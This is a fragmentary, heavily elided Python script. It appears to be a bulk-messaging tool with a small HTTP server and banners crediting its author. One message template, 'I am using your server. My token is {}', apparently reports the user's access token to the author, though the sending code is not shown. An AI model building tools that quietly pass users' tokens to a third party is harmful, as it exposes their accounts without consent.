...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"-- THIS SERVER MADE BY S9HB99N SH9IF3")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "Hello S4HB44N sir! I am using your server. My token is {}"
...
def send_messages_from_file():
      ...
      def liness():
          print('\033[1;92m' + '•───────────『S4HB44N•♡•SH4IF3』──────────────────────────────────────────────•')
